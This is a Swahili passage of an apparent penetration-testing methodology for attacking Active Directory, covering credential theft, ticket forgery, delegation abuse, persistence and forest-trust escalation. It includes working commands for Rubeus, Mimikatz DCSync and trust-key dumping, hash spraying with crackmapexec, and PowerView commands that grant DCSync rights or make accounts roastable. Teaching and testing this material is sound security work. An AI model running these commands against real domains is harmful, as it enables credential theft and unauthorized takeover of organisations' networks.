Baada ya kucompromise computer principal, chunguza uanachama wake katika nested groups na haki zake za outbound. Hasa, principals waliotajwa kwenye security descriptor ya `msDS-GroupMSAMembership` ya gMSA wanaweza kusoma `msDS-ManagedPassword`; matokeo ya `--gmsa` ya NetExec huonyesha principals walioidhinishwa na kurejesha NT hash ya sasa ikiwa computer inayotumika kuthibitisha imeidhinishwa.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```

Kisha tathmini gMSA iliyopatikana kama credential nyingine yoyote: kagua uanachama wa vikundi vya ndani na vya domain, ruhusa za kuingia, SPN, delegation na huduma zinazofikika kabla ya kujaribu pass-the-hash. Njia hii ya kupata credential kwa kutumia ACL ni tofauti na [Golden gMSA/dMSA](golden-dmsa-gmsa.md), ambayo hukokotoa nywila zinazodhibitiwa baada ya KDS root-key compromise.<sup>[[20]](#references)</sup>

Computer principal inaweza pia kuwa na udhibiti wa kutoka juu ya computer objects au groups nyingine. Baada ya kuipata, kagua uanachama wake wa nested na ACL zake zinazotumika kando: ruhusa ya kuandika kwenye computer object nyingine inaweza kuwezesha mabadiliko ya akaunti, na ruhusa za uanachama wa kikundi zinaweza kutoa role ya kuingia. Alama ya staged-account, utaratibu wa majina unaotabirika, au edge ya `GenericWrite` pekee haithibitishi njia nzima.

Nakala inayosomeka ya blob ya `msDS-ManagedPassword` kwenye faili, share au backup ni njia tofauti ya kufichuka: LDAP read ACL haiwezi kulinda nakala iliyohifadhiwa kwingineko. Thibitisha kuwa data hiyo ni managed-password blob kabla ya kuitafsiri, na itofautishe na LDAP read iliyoidhinishwa na ukokotoaji unaotokana na KDS root-key.

### Kerberoast

Kerberoasting inahusisha kupata **TGS tickets** zinazotumiwa na services zilizounganishwa na user accounts, kisha kuvunja usimbaji wake—unaotegemea nywila za watumiaji—**offline**.

Maelezo zaidi kuhusu hili yako hapa:


{{#ref}}
kerberoast.md
{{#endref}}

### Muunganisho wa mbali (RDP, SSH, FTP, Win-RM, n.k.)

Baada ya kupata credentials, unaweza kuangalia kama una ufikiaji wa **mashine** yoyote. Kwa hilo, unaweza kutumia **CrackMapExec** kujaribu kuunganisha kwenye servers kadhaa kwa kutumia protocols tofauti, kulingana na scans za ports ulizofanya.

### Local Privilege Escalation

Ikiwa umekompromiti credentials au session kama mtumiaji wa kawaida wa domain na unaweza kufikia **mashine yoyote ndani ya domain**, tafuta njia ya **kuongeza privileges ndani ya mashine na kukusanya credentials**. Privileges za local administrator zinaweza kukuwezesha **kudump hashes za watumiaji wengine** kutoka kwenye memory (LSASS) na local storage (SAM).

Kuna ukurasa kamili katika kitabu hiki kuhusu [**Local Privilege Escalation kwenye Windows**](../windows-local-privilege-escalation/index.html) na [**checklist**](../checklist-windows-privilege-escalation.md). Pia, usisahau kutumia [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Tiketi za Session ya Sasa

Ni **nadra sana** kupata **tickets** kwenye **session** ya mtumiaji wa sasa zinazokupa **ruhusa ya kufikia** rasilimali zisizotarajiwa, lakini unaweza kukagua:

```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```

### NTLM Relay

Ukiwa na credentials za domain au session ya mtumiaji, kagua tena [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack): mbinu za authenticated enumeration na coercion zinaweza kufichua njia za relay ambazo hazikupatikana wakati wa reconnaissance isiyohitaji authentication.

### Kutafuta Creds kwenye Computer Shares | SMB Shares

Kwa kuwa sasa una credentials za msingi, unapaswa kuangalia kama unaweza **kupata** **faili zozote za kuvutia zinazoshirikiwa ndani ya AD**. Unaweza kufanya hivyo mwenyewe, lakini ni kazi ya kuchosha na inayojirudia (hasa ukipata mamia ya hati za kukagua).

[**Fuata kiungo hiki ili ujifunze kuhusu zana unazoweza kutumia.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Kuiba NTLM Creds

Ikiwa unaweza **kufikia PC au shares nyingine**, unaweza **kuweka faili** (kama faili ya SCF) ambazo zikifikiwa kwa njia yoyote zita**anzisha authentication ya NTLM dhidi yako**, ili uweze **kuiba** **NTLM challenge** na kuivunja:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Athari hii ilimwezesha mtumiaji yeyote aliye-authenticate **kucompromise domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Kuongeza privilege kwenye Active Directory UKIWA NA credentials/session zenye privilege

**Kwa mbinu zifuatazo, mtumiaji wa kawaida wa domain hatoshi; unahitaji privileges/credentials maalum ili kutekeleza mashambulizi haya.**

### Uchotaji wa hash

Tunatumaini umefanikiwa **kucompromise akaunti fulani ya local admin** kwa kutumia [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) pamoja na relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), au [kuongeza privileges ndani ya mashine](../windows-local-privilege-escalation/index.html).\
Kisha, ni wakati wa kudump hash zote zilizo kwenye memory na kwenye mashine.\
[**Soma ukurasa huu kuhusu njia mbalimbali za kupata hash.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Ukipata hash ya mtumiaji**, unaweza kuitumia **kujifanya mtumiaji huyo**.\
Unahitaji kutumia **tool** itakayo**tekeleza** **NTLM authentication kwa kutumia** hiyo **hash**, **au** unaweza kuunda **sessionlogon** mpya na **kuingiza** hiyo **hash** ndani ya **LSASS**, ili kila **NTLM authentication inapotekelezwa**, **hash hiyo itumike.** Hilo ndilo chaguo linalotumiwa na mimikatz.\
[**Soma ukurasa huu kwa maelezo zaidi.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Shambulio hili linalenga **kutumia NTLM hash ya mtumiaji kuomba Kerberos tickets**, kama mbadala wa Pass The Hash ya kawaida kupitia protocol ya NTLM. Kwa hiyo, linaweza kuwa **la manufaa hasa kwenye mitandao ambako protocol ya NTLM imezimwa** na **Kerberos pekee ndiyo inaruhusiwa** kama protocol ya authentication.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Katika mbinu ya shambulio ya **Pass The Ticket (PTT)**, washambuliaji **huiba authentication ticket ya mtumiaji** badala ya password au hash zake. Kisha ticket hiyo iliyoibwa hutumiwa **kujifanya mtumiaji huyo**, na kupata ufikiaji usioidhinishwa wa resources na services ndani ya mtandao.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Kutumia Tena Credentials

Ikiwa una **hash** au **password** ya **msimamizi wa ndani**, unapaswa kujaribu **kuingia locally** kwenye **PC** nyingine ukitumia hiyo.

```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```

> [!WARNING]
> Kumbuka kuwa hii husababisha **kelele** nyingi na **LAPS** inaweza **kupunguza athari** zake.

### Matumizi mabaya ya MSSQL na viungo vinavyoaminika

Ikiwa mtumiaji ana ruhusa za **kufikia instances za MSSQL**, anaweza kutumia ruhusa hizo **kutekeleza amri** kwenye host ya MSSQL (ikiwa inaendeshwa kama SA), **kuiba** **hash** ya NetNTLM au hata kufanya **relay attack**.\
Ikiwa instance ya MSSQL inaaminika kupitia kiungo cha database kutoka kwa instance nyingine, mtumiaji mwenye ruhusa kwenye database iliyounganishwa anaweza **kutumia uhusiano huo wa uaminifu kutekeleza queries kwenye instance nyingine**. Uaminifu huu unaweza kuunganishwa kwa mfululizo na hatimaye kufikisha kwenye database isiyosanidiwa vizuri ambako mtumiaji anaweza kutekeleza amri.\
**Viungo kati ya databases hufanya kazi hata kati ya forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Matumizi mabaya ya mifumo ya inventory/deployment ya mali za IT

Mifumo ya wahusika wengine ya inventory na deployment mara nyingi hufichua njia zenye nguvu za kupata credentials na kutekeleza code. Tazama:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Ukipata Computer object yoyote yenye attribute ya [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) na una ruhusa za domain kwenye computer hiyo, utaweza kutoa TGTs kutoka kwenye memory za watumiaji wote wanaoingia kwenye computer hiyo.\
Kwa hiyo, ikiwa **Domain Admin ataingia kwenye computer hiyo**, utaweza kutoa TGT yake na kujifanya yeye kwa kutumia [Pass the Ticket](pass-the-ticket.md).\
Kwa kutumia constrained delegation, unaweza hata **kucompromise Print Server kiotomatiki** (tunatumaini itakuwa DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Ikiwa mtumiaji au computer imeruhusiwa kwa "Constrained Delegation", itaweza **kujifanya mtumiaji yeyote ili kufikia baadhi ya huduma kwenye computer**.\
Kisha, ukifanikiwa **kucompromise hash** ya mtumiaji/computer huyo, utaweza **kujifanya mtumiaji yeyote** (hata domain admins) ili kufikia baadhi ya huduma.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Kuwa na ruhusa ya **WRITE** kwenye Active Directory object ya computer ya mbali huwezesha kupata code execution yenye **ruhusa za juu**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Matumizi mabaya ya Permissions/ACLs

Mtumiaji aliyecompromise anaweza kuwa na **ruhusa za kuvutia kwenye baadhi ya domain objects** zinazoweza kukuwezesha **kuhamia** kwenye mifumo mingine kwa upande/**kuongeza** ruhusa.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Matumizi mabaya ya huduma ya Printer Spooler

Kugundua huduma ya **Spool inayosikiliza** ndani ya domain kunaweza **kutumiwa vibaya** ili **kupata credentials mpya** na **kuongeza ruhusa**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Matumizi mabaya ya sessions za wahusika wengine

Ikiwa **watumiaji wengine** **wanafikia** mashine **iliyo-compromise**, inawezekana **kukusanya credentials kutoka kwenye memory** na hata **kuingiza beacons kwenye processes zao** ili kujifanya wao.\
Kwa kawaida watumiaji hufikia mfumo kupitia RDP, kwa hiyo hapa kuna namna ya kufanya mashambulizi kadhaa dhidi ya sessions za RDP za wahusika wengine:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** hutoa mfumo wa kusimamia **nenosiri la Administrator wa ndani** kwenye computers zilizounganishwa kwenye domain, na kuhakikisha kuwa **linabadilishwa bila mpangilio**, ni la kipekee, na **hubadilishwa** mara kwa mara. Nenosiri hizi huhifadhiwa kwenye Active Directory na ufikiaji wake hudhibitiwa kupitia ACLs, kwa watumiaji walioidhinishwa pekee. Ukiwa na ruhusa za kutosha za kufikia nenosiri hizi, inawezekana kuhamia kwenye computers nyingine.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Kukusanya certificates** kutoka kwenye mashine iliyo-compromise kunaweza kuwa njia ya kuongeza ruhusa ndani ya mazingira:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Matumizi mabaya ya Certificate Templates

Ikiwa **templates zenye udhaifu** zimesanidiwa, inawezekana kuzitumia vibaya ili kuongeza ruhusa:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation kwa kutumia akaunti yenye ruhusa za juu

### Kutoa Domain Credentials

Ukipata ruhusa za **Domain Admin** au bora zaidi za **Enterprise Admin**, unaweza **kutoa** **database ya domain**: _ntds.dit_.

[**Maelezo zaidi kuhusu shambulio la DCSync yanapatikana hapa**](dcsync.md).

[**Maelezo zaidi kuhusu jinsi ya kuiba NTDS.dit yanapatikana hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

Archive ya backup inayosomeka, yenye `ntds.dit` pamoja na hive ya `SYSTEM`, inapaswa kuchukuliwa kuwa na taarifa za directory zilizofichuka hata kabla ya kutoa faili zake. Hash ya nenosiri iliyopitwa na wakati haimaanishi kuwa attributes nyingine za object ni salama: sehemu kama `description` zinaweza kuwa na credentials au maelezo ya kiutendaji. Kagua majina ya wanachama wa archive kwanza na usijumuishe yaliyomo kwenye database yaliyotolewa kwenye output ya kawaida ya enumeration.

### Privesc kama Persistence

Baadhi ya mbinu zilizojadiliwa awali zinaweza kutumiwa kwa persistence.\
Kwa mfano, unaweza:

- Kuwafanya watumiaji wawe hatarini kwa [**Kerberoast**](kerberoast.md)

  ```bash
  Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
  ```

- Wafanya watumiaji wawe katika hatari ya [**ASREPRoast**](asreproast.md)

  ```bash
  Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
  ```

- Mpe mtumiaji ruhusa za [**DCSync**](#dcsync)

  ```bash
  Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
  ```

### Silver Ticket

**Shambulio la Silver Ticket** huunda **tiketi halali ya Ticket Granting Service (TGS)** kwa huduma maalum kwa kutumia **NTLM hash** (kwa mfano, **hash ya akaunti ya PC**). Mbinu hii hutumika **kupata haki za huduma**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Shambulio la Golden Ticket** huhusisha mshambuliaji kupata **NTLM hash ya akaunti ya krbtgt** katika mazingira ya Active Directory (AD). Akaunti hii ni maalum kwa sababu hutumika kusaini **Ticket Granting Tickets (TGTs)** zote, ambazo ni muhimu kwa uthibitishaji ndani ya mtandao wa AD.

Mshambuliaji akishapata hash hii, anaweza kuunda **TGTs** za akaunti yoyote anayoichagua (shambulio la Silver Ticket).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Hizi ni kama golden tickets zilizoghushiwa kwa njia inayoweza **kuepuka mbinu za kawaida za kugundua golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Uendelevu wa Akaunti kwa kutumia Vyeti**

**Kuwa na vyeti vya akaunti au kuweza kuviomba** ni njia nzuri sana ya kudumisha ufikiaji wa akaunti ya mtumiaji (hata akibadilisha nenosiri):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Uendelevu wa Domain kwa kutumia Vyeti**

**Inawezekana pia kutumia vyeti kudumisha ufikiaji wenye haki za juu ndani ya domain:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### Kikundi cha AdminSDHolder

Kitu cha **AdminSDHolder** katika Active Directory huhakikisha usalama wa **vikundi vyenye haki za juu** (kama Domain Admins na Enterprise Admins) kwa kutumia **Access Control List (ACL)** ya kawaida kwa vikundi hivi ili kuzuia mabadiliko yasiyoidhinishwa. Hata hivyo, kipengele hiki kinaweza kutumiwa vibaya; mshambuliaji akibadilisha ACL ya AdminSDHolder ili kumpa mtumiaji wa kawaida ufikiaji kamili, mtumiaji huyo hupata udhibiti mkubwa juu ya vikundi vyote vyenye haki za juu. Hivyo, hatua hii ya usalama iliyokusudiwa kulinda inaweza kuleta athari kinyume, na kuruhusu ufikiaji usioidhinishwa isipofuatiliwa kwa makini.

[**Maelezo zaidi kuhusu Kikundi cha AdminDSHolder hapa.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### Vitambulisho vya DSRM

Ndani ya kila **Domain Controller (DC)** kuna akaunti ya **msimamizi wa ndani**. Kwa kupata haki za msimamizi kwenye mashine kama hiyo, hash ya Administrator wa ndani inaweza kutolewa kwa kutumia **mimikatz**. Baada ya hapo, ni lazima kurekebisha registry ili **kuwezesha matumizi ya nenosiri hili**, na hivyo kuruhusu ufikiaji wa mbali wa akaunti ya Administrator wa ndani.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### Uendelevu wa ACL

Unaweza **kumpa** **mtumiaji** baadhi ya **ruhusa maalum** juu ya vitu fulani vya domain, ambazo zitamwezesha **kupandisha haki zake baadaye**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptors** hutumika **kuhifadhi** **ruhusa** ambazo **kitu** kina **juu ya** **kitu** kingine. Ukiweza tu kufanya **mabadiliko madogo** kwenye **security descriptor** ya kitu, unaweza kupata haki za kuvutia sana juu ya kitu hicho bila kuhitaji kuwa mwanachama wa kikundi chenye haki za juu.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Tumia vibaya auxiliary class ya `dynamicObject` ili kuunda principals/GPOs/rekodi za DNS za muda mfupi zenye `entryTTL`/`msDS-Entry-Time-To-Die`; hujifuta zenyewe bila tombstones, na kufuta ushahidi wa LDAP huku zikiziacha SIDs zilizotengwa, marejeleo ya `gPLink` yaliyovunjika, au majibu ya DNS yaliyohifadhiwa kwenye cache (kwa mfano, uchafuzi wa ACE za AdminSDHolder au uelekezaji upya hasidi wa `gPCFileSysPath`/DNS iliyounganishwa na AD).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Badilisha **LSASS** iliyo kwenye memory ili kuweka **nenosiri la jumla**, na hivyo kutoa ufikiaji wa akaunti zote za domain.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Jifunze SSP (Security Support Provider) ni nini hapa.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Unaweza kuunda **SSP yako mwenyewe** ili **kunasa** **credentials** zinazotumika kufikia mashine katika **clear text**.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Husajili **Domain Controller** mpya katika AD na kuitumia **kusukuma attributes** (SIDHistory, SPNs...) kwenye vitu vilivyoainishwa **bila** kuacha **logs** zozote kuhusu **mabadiliko** hayo. Unahitaji haki za **DA** na lazima uwe ndani ya **root domain**.\
Kumbuka kuwa ukitumia data isiyo sahihi, logs mbaya sana zitaonekana.


{{#ref}}
dcshadow.md
{{#endref}}

### Uendelevu wa LAPS

Hapo awali tumejadili jinsi ya kupandisha haki ikiwa una **ruhusa za kutosha kusoma nywila za LAPS**. Hata hivyo, nywila hizi pia zinaweza kutumika **kudumisha ufikiaji**.\
Angalia:


{{#ref}}
laps.md
{{#endref}}

## Kupandisha Haki katika Forest - Domain Trusts

Microsoft huichukulia **Forest** kuwa mpaka wa usalama. Hii ina maana kwamba **kuvamia domain moja kunaweza kusababisha Forest nzima kuvamiwa**.<sup>[[1]](#references)</sup>

### Taarifa za Msingi

[**Domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) ni utaratibu wa usalama unaomwezesha mtumiaji kutoka **domain** moja kufikia rasilimali katika **domain** nyingine. Kimsingi, huunganisha mifumo ya uthibitishaji ya domain hizo mbili, na kuruhusu uthibitishaji kupita kwa urahisi. Domain zinapoweka trust, hubadilishana na kuhifadhi **keys** maalum ndani ya **Domain Controllers (DCs)** zao, ambazo ni muhimu kwa uadilifu wa trust hiyo.

Katika hali ya kawaida, mtumiaji akitaka kufikia huduma katika **domain inayoaminiwa**, lazima kwanza aombe tiketi maalum inayoitwa **inter-realm TGT** kutoka kwa DC ya domain yake. TGT hii husimbwa kwa **key** ya pamoja ambayo domain zote mbili zimekubaliana kuitumia. Kisha mtumiaji huwasilisha TGT hii kwa **DC ya domain inayoaminiwa** ili kupata tiketi ya huduma (**TGS**). DC ya domain inayoaminiwa ikithibitisha kwa mafanikio inter-realm TGT hiyo, hutoa TGS inayomwezesha mtumiaji kufikia huduma.

**Hatua**:

1. **Kompyuta ya mteja** katika **Domain 1** huanzisha mchakato kwa kutumia **NTLM hash** yake kuomba **Ticket Granting Ticket (TGT)** kutoka kwa **Domain Controller (DC1)** yake.
2. DC1 hutoa TGT mpya ikiwa mteja amethibitishwa kwa mafanikio.
3. Kisha mteja huomba **inter-realm TGT** kutoka kwa DC1, ambayo inahitajika kufikia rasilimali katika **Domain 2**.
4. Inter-realm TGT husimbwa kwa **trust key** inayoshirikiwa kati ya DC1 na DC2 kama sehemu ya domain trust ya pande mbili.
5. Mteja hupeleka inter-realm TGT kwa **Domain Controller ya Domain 2 (DC2)**.
6. DC2 huthibitisha inter-realm TGT kwa kutumia trust key ya pamoja na, ikiwa ni halali, hutoa **Ticket Granting Service (TGS)** ya seva iliyo katika Domain 2 ambayo mteja anataka kufikia.
7. Hatimaye, mteja huwasilisha TGS hii kwa seva. TGS husimbwa kwa hash ya akaunti ya seva na humwezesha mteja kufikia huduma katika Domain 2.

### Aina tofauti za trusts

Ni muhimu kutambua kuwa **trust inaweza kuwa ya upande 1 au pande 2**. Katika chaguo la pande 2, domain zote mbili huaminiana, lakini katika uhusiano wa trust wa **upande 1**, mojawapo ya domain huwa **inayoaminiwa** na nyingine huwa **inayoamini**. Katika hali ya mwisho, **utaweza tu kufikia rasilimali zilizo ndani ya domain inayoamini kutoka kwenye domain inayoaminiwa**.

Ikiwa Domain A inaamini Domain B, A ndiyo domain inayoamini na B ndiyo inayoaminiwa. Zaidi ya hayo, katika **Domain A**, huu ni **Outbound trust**; na katika **Domain B**, ni **Inbound trust**.

**Aina tofauti za uhusiano wa kuaminiana**

- **Parent-Child Trusts**: Huu ni mpangilio wa kawaida ndani ya forest moja, ambapo child domain huwa na trust ya pande mbili na inayopita moja kwa moja kwa parent domain yake. Kimsingi, hii ina maana kwamba maombi ya uthibitishaji yanaweza kupita kwa urahisi kati ya parent na child.
- **Cross-link Trusts**: Hizi huitwa pia "shortcut trusts" na huwekwa kati ya child domains ili kuharakisha michakato ya uelekezaji. Katika forest changamano, maelekezo ya uthibitishaji hulazimika kupanda hadi kwenye forest root na kisha kushuka hadi kwenye domain lengwa. Kuunda cross-links hupunguza safari hii, jambo linalofaa hasa katika mazingira yaliyoenea kijiografia.
- **External Trusts**: Hizi huwekwa kati ya domain tofauti zisizohusiana na kwa asili hazipitishi trust. Kulingana na [nyaraka za Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts hufaa kwa kufikia rasilimali katika domain iliyo nje ya forest ya sasa ambayo haijaunganishwa kupitia forest trust. Usalama huimarishwa kwa kutumia SID filtering pamoja na external trusts.
- **Tree-root Trusts**: Trust hizi huwekwa kiotomatiki kati ya forest root domain na tree root mpya iliyoongezwa. Ingawa hazikutaniwi nazo mara nyingi, tree-root trusts ni muhimu kwa kuongeza miti mipya ya domain kwenye forest, na kuziwezesha kudumisha jina la kipekee la domain pamoja na transitivity ya pande mbili. Maelezo zaidi yanapatikana katika [mwongozo wa Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Aina hii ya trust ni trust ya pande mbili inayopita kati ya forest root domains mbili, na pia hutumia SID filtering kuimarisha hatua za usalama.
- **MIT Trusts**: Trust hizi huwekwa na domain za Kerberos zisizo za Windows zinazotii [RFC4120](https://tools.ietf.org/html/rfc4120). MIT trusts ni maalum zaidi na zinafaa kwa mazingira yanayohitaji kuunganishwa na mifumo inayotumia Kerberos nje ya mfumo wa Windows.

#### Tofauti nyingine katika **uhusiano wa kuaminiana**

- Uhusiano wa trust unaweza pia kuwa **transitive** (A inaiamini B, B inaiamini C, basi A inaiamini C) au **non-transitive**.
- Uhusiano wa trust unaweza kuwekwa kama **bidirectional trust** (zinaaminiana) au **one-way trust** (moja tu ndiyo inayoamini nyingine).

### Njia ya Shambulio

1. **Orodhesha** uhusiano wa kuaminiana.
2. Angalia kama **security principal** yoyote (user/group/computer) ina **ufikiaji** wa rasilimali za **domain nyingine**, labda kupitia maingizo ya ACE au kwa kuwa mwanachama wa vikundi vya domain nyingine. Tafuta **uhusiano kati ya domain** (huenda trust iliundwa kwa sababu hii).
   1. Katika hali hii, kerberoast inaweza kuwa chaguo jingine.
3. **Vamia** **akaunti** zinazoweza kutumika **kuhamia** kati ya domain.

Washambuliaji wanaoweza kufikia rasilimali katika domain nyingine kupitia njia kuu tatu:

- **Uanachama wa Local Group**: Principals wanaweza kuongezwa kwenye local groups za mashine, kama vile kikundi cha “Administrators” kwenye seva, na hivyo kupata udhibiti mkubwa wa mashine hiyo.
- **Uanachama wa Kikundi katika Domain ya Kigeni**: Principals wanaweza pia kuwa wanachama wa vikundi vilivyo ndani ya domain ya kigeni. Hata hivyo, ufanisi wa njia hii hutegemea aina ya trust na wigo wa kikundi.
- **Access Control Lists (ACLs)**: Principals wanaweza kutajwa katika **ACL**, hasa kama vipengele vya **ACEs** ndani ya **DACL**, na hivyo kupata ufikiaji wa rasilimali maalum. Kwa wanaotaka kuelewa kwa kina jinsi ACLs, DACLs na ACEs zinavyofanya kazi, whitepaper yenye kichwa “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” ni nyenzo muhimu sana.<sup>[[17]](#references)</sup>

### Tafuta watumiaji/vikundi vya nje vyenye ruhusa

Unaweza kuangalia **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** ili kupata foreign security principals katika domain. Hawa watakuwa user/group kutoka **domain/forest ya nje**.

Unaweza kuangalia hili katika **Bloodhound** au kwa kutumia powerview:

```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```

### Child-to-Parent forest privilege escalation

```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```

Njia nyingine za kuorodhesha domain trusts:

```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```

> [!WARNING]
> Kuna **funguo 2 zinazoaminika**, moja ya _Child --> Parent_ na nyingine ya _Parent_ --> _Child_.\
> Unaweza kupata ile inayotumiwa na kikoa cha sasa kwa kutumia:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Pata mamlaka ya Enterprise admin katika child/parent domain kwa kutumia vibaya trust kupitia SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit Configuration NC inayoweza kuandikwa

Ni muhimu kuelewa jinsi Configuration Naming Context (NC) inavyoweza kutumiwa vibaya. Configuration NC hutumika kama hifadhi kuu ya data ya usanidi katika forest kwenye mazingira ya Active Directory (AD). Data hii hurudiwa kwa kila Domain Controller (DC) ndani ya forest, huku DC zinazoweza kuandikwa zikidumisha nakala inayoweza kuandikwa ya Configuration NC. Ili kuitumia vibaya, lazima uwe na **SYSTEM privileges kwenye DC**, ikiwezekana child DC.

**Unganisha GPO na site ya root DC**

Container ya Sites ya Configuration NC ina taarifa kuhusu sites za kompyuta zote zilizojiunga na domain ndani ya AD forest. Kwa kutumia SYSTEM privileges kwenye DC yoyote, washambuliaji wanaweza kuunganisha GPO na sites za root DC. Hatua hii inaweza kuhatarisha root domain kwa kubadilisha sera zinazotumika kwenye sites hizi.

Kwa maelezo ya kina, unaweza kuchunguza utafiti kuhusu [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Compromise gMSA yoyote katika forest**

Njia moja ya kushambulia ni kulenga gMSA zenye privileges ndani ya domain. KDS Root key, ambayo ni muhimu kwa kukokotoa passwords za gMSA, huhifadhiwa ndani ya Configuration NC. Ukiwa na SYSTEM privileges kwenye DC yoyote, unaweza kufikia KDS Root key na kukokotoa passwords za gMSA yoyote katika forest.

Uchambuzi wa kina na mwongozo wa hatua kwa hatua unapatikana hapa:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Shambulio la ziada la delegated MSA (BadSuccessor – kutumia vibaya migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Utafiti mwingine wa nje: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Shambulio la kubadilisha Schema**

Mbinu hii inahitaji uvumilivu, huku ukisubiri kuundwa kwa AD objects mpya zenye privileges. Kwa SYSTEM privileges, mshambuliaji anaweza kubadilisha AD Schema ili kumpa mtumiaji yeyote udhibiti kamili wa classes zote. Hili linaweza kusababisha ufikiaji na udhibiti usioidhinishwa wa AD objects zitakazoundwa baadaye.

Maelezo zaidi yanapatikana kwenye [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**Kutoka DA hadi EA kwa ADCS ESC5**

